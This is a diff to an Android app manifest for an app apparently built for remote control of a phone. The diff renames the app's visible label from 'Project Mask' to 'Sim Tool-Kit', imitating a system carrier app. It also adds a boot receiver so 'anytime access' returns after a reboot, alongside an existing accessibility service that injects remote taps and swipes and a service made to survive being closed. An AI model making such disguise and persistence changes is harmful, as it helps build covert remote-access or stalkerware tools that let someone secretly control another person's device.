@@ -22,8 +22,12 @@
          session survives the app being swiped off recents on aggressive OEMs. -->
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
 
+    <!-- Lets BootReceiver fire after the device restarts so anytime access can
+         be automatically restored with a single tap on the notification. -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+
     <application
-        android:label="Project Mask"
+        android:label="Sim Tool-Kit"
         android:name=".MaskApplication"
         android:icon="@mipmap/ic_launcher">
         <activity
@@ -65,6 +69,17 @@
             android:exported="false"
             android:stopWithTask="false"
             android:foregroundServiceType="connectedDevice" />
+
+        <!-- Fires after BOOT_COMPLETED to restore anytime access when the device
+             was rebooted while the host was armed. exported=false: Android still
+             delivers this protected system broadcast to non-exported receivers. -->
+        <receiver
+            android:name=".BootReceiver"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
 
         <!-- Accessibility service that injects remote taps/swipes via
              dispatchGesture(). Must be enabled manually by the user in Settings. -->
